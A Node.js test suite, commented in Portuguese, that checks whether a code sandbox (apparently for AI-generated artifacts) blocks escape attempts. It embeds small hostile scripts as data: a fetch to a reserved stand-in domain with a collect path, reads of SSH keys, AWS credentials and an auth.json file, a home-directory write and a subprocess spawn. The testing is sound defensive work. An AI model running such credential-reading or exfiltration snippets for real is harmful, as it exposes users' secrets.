/**
 * escape.test.mjs — a prova de que o sandbox barra de verdade.
 *
 * O resto da suíte prova que o gate *classifica*. Este arquivo escreve artefatos
 * maliciosos reais e prova que o processo **não consegue** sair:
 *
 *  1. roda com o gate ligado (caminho de produção)
 *  2. roda com `precheck: false`, para isolar a camada 2 — se o runtime
 *     deixasse passar, o artefato passaria aqui
 *
 * Cada caso registra qual camada barrou. Se algum passar, o teste falha com o
 * stderr completo: é buraco real, não bug de teste.
 *
 * Alvos: `example.invalid` (domínio reservado por RFC 2606, não gera tráfego),
 * `C:/Windows/System32/drivers/etc/hosts` (fora do worktree, leitura),
 * `os.homedir()` (fora do worktree, escrita).
 */

import test, { after } from "node:test";
import assert from "node:assert/strict";

import { mkdtemp, mkdir, writeFile, readFile, rm, access } from "node:fs/promises";
import os from "node:os";
import path from "node:path";

import { runSandboxed } from "./run-sandboxed.mjs";
import { evaluate } from "./static-gate.mjs";

const TIMEOUT = 10_000;
const WORKDIRS = [];

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */

async function workspace(files = {}) {
  await mkdir(path.join(os.tmpdir(), "selfevopi-escape"), { recursive: true });
  const dir = await mkdtemp(path.join(os.tmpdir(), "selfevopi-escape-"));
  WORKDIRS.push(dir);
  for (const [name, body] of Object.entries(files)) {
    await writeFile(path.join(dir, name), body, "utf8");
  }
  return dir;
}

async function exists(p) {
  try {
    await access(p);
    return true;
  } catch {
    return false;
  }
}

/**
 * Roda um artefato nas duas modidades e devolve tudo que o teste precisa:
 *  - gate: veredito da camada 1 sobre o código
 *  - comGate: execução real (gate + runtime) — o caminho de produção
 *  - semGate: execução com precheck desligado — isola a camada 2
 */
async function probe({ id, arquivo, codigo }) {
  const workdir = await workspace({ [arquivo]: codigo });
  const source = path.join(workdir, arquivo);

  const gate = evaluate(codigo, { file: source, workspace: workdir });
  const comGate = await runSandboxed({ script: source, workdir, timeoutMs: TIMEOUT });
  const semGate = await runSandboxed({ script: source, workdir, timeoutMs: TIMEOUT, precheck: false });

  return { id, workdir, source, gate, comGate, semGate };
}

/** Evidência em uma linha, para aparecer na saída do teste e no relatório. */
function evidence(p) {
  const camada =
    p.gate.decision === "block" ? "gate + runtime" : "runtime (gate deixou passar)";
  const linhas = (p.semGate.stderr || "").split("\n").map((l) => l.trim());
  // prefere a mensagem humana; cair para o código só se não houver
  const achado =
    linhas.find((l) => /^Error: /.test(l)) ??
    linhas.find((l) => /SelfEvoPI sandbox:/.test(l)) ??
    linhas.find((l) => /has been restricted/.test(l)) ??
    linhas.find((l) => /ERR_ACCESS_DENIED/.test(l)) ??
    "";
  const curto = achado.replace(/\s+/g, " ").slice(0, 96);
  return `${camada.padEnd(30)} | exit=${p.semGate.exitCode} | ${curto}`;
}

/** Garante que o artefato não colheu o que queria. */
function assertDenied(p, { stdoutForbidden = null } = {}) {
  assert.equal(p.comGate.ok, false, `CAMINHO DE PRODUÇÃO PASSOU: ${p.id}\nstdout=${p.comGate.stdout}\nstderr=${p.comGate.stderr}`);
  assert.equal(p.semGate.ok, false, `RUNTIME PASSOU (buraco na camada 2): ${p.id}\nstdout=${p.semGate.stdout}\nstderr=${p.semGate.stderr}`);

  if (stdoutForbidden) {
    assert.ok(
      !stdoutForbidden.test(p.semGate.stdout),
      `${p.id}: o script conseguiu produzir "${stdoutForbidden}" — stdout=${p.semGate.stdout}`
    );
  }
}

/* ------------------------------------------------------------------ */
/* 1. Rede                                                             */
/* ------------------------------------------------------------------ */

test("rede: fetch para domínio reservado não volta 200", async () => {
  const p = await probe({
    id: "rede",
    arquivo: "rede.mjs",
    codigo: [
      'const r = await fetch("https://example.invalid/collect?d=1");',
      'console.log("STATUS", r.status);',
      'console.log("CORPO", await r.text());',
      "",
    ].join("\n"),
  });

  assert.equal(p.gate.decision, "block", "o gate já deveria barrar fetch");
  assert.ok(p.gate.blockingRules.includes("network-access"));

  assertDenied(p, { stdoutForbidden: /STATUS 200/ });

  // tem de ser a recusa do preload, não um erro de DNS
  assert.match(p.semGate.stderr, /ERR_ACCESS_DENIED/, `stderr=${p.semGate.stderr}`);
  assert.match(p.semGate.stderr, /fetch/, `a recusa tem de vir do preload de rede: ${p.semGate.stderr}`);
  assert.doesNotMatch(p.semGate.stderr, /ENOTFOUND|EAI_AGAIN|getaddrinfo/, "não pode ter sido falha de DNS");

  p.evidence = evidence(p);
  console.log(`  rede ............ ${p.evidence}`);
});

/* ------------------------------------------------------------------ */
/* 2. Disco externo: leitura                                           */
/* ------------------------------------------------------------------ */

test("disco externo: ler hosts do Windows falha", async () => {
  const alvo = "C:/Windows/System32/drivers/etc/hosts";

  const p = await probe({
    id: "leitura-hosts",
    arquivo: "le-hosts.mjs",
    codigo: [
      'import fs from "node:fs";',
      `const segredo = fs.readFileSync(${JSON.stringify(alvo)}, "utf8");`,
      'console.log("CONSEGUI", segredo.length);',
      "",
    ].join("\n"),
  });

  // o caminho é absoluto e externo: o gate avisa, não bloqueia — quem barra é o runtime
  assert.ok(
    p.gate.warningRules.includes("outside-workspace-path"),
    `o gate deveria ao menos avisar: ${JSON.stringify(p.gate.warningRules)}`
  );
  assert.notEqual(p.gate.decision, "block", "a leitura externa é caso de runtime, não de gate");

  assertDenied(p, { stdoutForbidden: /CONSEGUI/ });
  assert.match(p.semGate.stderr, /ERR_ACCESS_DENIED/, `stderr=${p.semGate.stderr}`);
  assert.match(p.semGate.stderr, /FileSystemRead/);

  p.evidence = evidence(p);
  console.log(`  disco (leitura) . ${p.evidence}`);
});

/* ------------------------------------------------------------------ */
/* 3. Disco externo: escrita no home                                   */
/* ------------------------------------------------------------------ */

test("disco externo: escrever no os.homedir() falha e não cria arquivo", async () => {
  const alvo = path.join(os.homedir(), ".selfevopi-escape-probe.txt");
  await rm(alvo, { force: true });

  const p = await probe({
    id: "escrita-home",
    arquivo: "escreve-home.mjs",
    codigo: [
      'import fs from "node:fs";',
      'import os from "node:os";',
      'import path from "node:path";',
      `const alvo = ${JSON.stringify(alvo)};`,
      'fs.writeFileSync(alvo, "escape");',
      'console.log("ESCREVI", alvo);',
      "",
    ].join("\n"),
  });

  assertDenied(p, { stdoutForbidden: /ESCREVI/ });
  assert.match(p.semGate.stderr, /ERR_ACCESS_DENIED/, `stderr=${p.semGate.stderr}`);

  const criado = await exists(alvo);
  assert.equal(criado, false, `o arquivo ${alvo} foi criado — a escrita fora do worktree passou`);
  if (criado) await rm(alvo, { force: true }); // não deixa lixo no home

  p.evidence = evidence(p);
  console.log(`  disco (escrita) . ${p.evidence}`);
});

/* ------------------------------------------------------------------ */
/* 4. Subprocesso                                                      */
/* ------------------------------------------------------------------ */

test("subprocesso: spawnSync é recusado e nenhum filho nasce", async () => {
  const p = await probe({
    id: "spawn",
    arquivo: "spawn.mjs",
    codigo: [
      'import { spawnSync } from "node:child_process";',
      'const r = spawnSync("node", ["-e", "console.log(42)"], { encoding: "utf8" });',
      'console.log("FILHO", r.stdout);',
      "",
    ].join("\n"),
  });

  assert.equal(p.gate.decision, "block");
  assert.ok(p.gate.blockingRules.includes("child-process"));

  assertDenied(p, { stdoutForbidden: /FILHO/ });
  assert.match(p.semGate.stderr, /ERR_ACCESS_DENIED/, `stderr=${p.semGate.stderr}`);
  // a recusa é do runtime (ChildProcess), não do preload
  assert.match(p.semGate.stderr, /ChildProcess/, `esperava recusa do Permission Model: ${p.semGate.stderr}`);

  p.evidence = evidence(p);
  console.log(`  subprocesso ..... ${p.evidence}`);
});

/* ------------------------------------------------------------------ */
/* 5. Credenciais                                                      */
/* ------------------------------------------------------------------ */

const CASOS_DE_CREDENCIAL = [
  {
    id: "ssh",
    rotulo: "ssh",
    caminho: () => path.join(os.homedir(), ".ssh", "id_rsa"),
    gateDeveBarrar: true,
  },
  {
    id: "aws",
    rotulo: "aws",
    caminho: () => path.join(os.homedir(), ".aws", "credentials"),
    // Era `false` — a lacuna que a propria prova de sandbox apontou: o gate nao
    // tinha regra para `.aws` e so o Permission Model barrava. Regra adicionada
    // em static-gate.mjs (credential-store), entao agora o gate tambem barra.
    gateDeveBarrar: true,
  },
  {
    id: "config-opencode",
    rotulo: "config PI",
    caminho: () => path.join(os.homedir(), ".config", "opencode", "auth.json"),
    gateDeveBarrar: true,
  },
];

for (const caso of CASOS_DE_CREDENCIAL) {
  test(`credenciais: ${caso.gateDeveBarrar ? "gate + runtime barram" : "runtime barra"} a leitura de ${caso.rotulo}`, async () => {
    const alvo = caso.caminho();

    const p = await probe({
      id: caso.id,
      arquivo: `le-${caso.id}.mjs`,
      codigo: [
        'import fs from "node:fs";',
        `const segredo = fs.readFileSync(${JSON.stringify(alvo)}, "utf8");`,
        'console.log("CONSEGUI", segredo.slice(0, 8));',
        "",
      ].join("\n"),
    });

    if (caso.gateDeveBarrar) {
      assert.equal(p.gate.decision, "block", `${caso.id}: o gate deveria barrar (${p.gate.blockingRules})`);
    } else {
      assert.notEqual(p.gate.decision, "block", `${caso.id}: este caso é do runtime, não do gate`);
    }

    assertDenied(p, { stdoutForbidden: /CONSEGUI/ });
    assert.match(p.semGate.stderr, /ERR_ACCESS_DENIED/, `stderr=${p.semGate.stderr}`);

    p.evidence = evidence(p);
    console.log(`  credencial (${caso.rotulo.padEnd(10)}) ${p.evidence}`);
  });
}

/* ------------------------------------------------------------------ */
/* 6. Ambiente: segredo do harness não desce para o filho              */
/* ------------------------------------------------------------------ */

test("ambiente: segredo do harness não chega ao processo filho", async () => {
  const nome = "SELFEVOPI_FAKE_TOKEN";
  process.env[nome] = "segredo-que-nao-deve-vazar";

  try {
    const p = await probe({
      id: "env",
      arquivo: "env.mjs",
      codigo: [
        `console.log("TOKEN", JSON.stringify(process.env[${JSON.stringify(nome)}] ?? null));`,
        'console.log("TEM_PATH", process.env.PATH ? "sim" : "nao");',
        "",
      ].join("\n"),
    });

    // camada 1: o nome tem cara de segredo, o gate nem deixa rodar
    assert.equal(p.comGate.blocked, true, "o gate deveria barrar a leitura de nome de segredo");

    // camada 2: sem o gate, o processo roda mas não vê a variável do pai
    assert.equal(p.semGate.ok, true, `artefato legítimo deveria rodar: ${p.semGate.stderr}`);
    assert.match(p.semGate.stdout, /TOKEN null/, `o segredo do pai vazou: ${p.semGate.stdout}`);
    assert.match(p.semGate.stdout, /TEM_PATH sim/, "PATH é da allowlist e deveria existir");
  } finally {
    delete process.env[nome];
  }

  console.log(`  ambiente ........ ${"gate bloqueia; runtime isola".padEnd(30)} | exit=0 | PATH sim, token null`);
});

/* ------------------------------------------------------------------ */
/* Fechamento                                                          */
/* ------------------------------------------------------------------ */

after(async () => {
  for (const dir of WORKDIRS) await rm(dir, { recursive: true, force: true });
});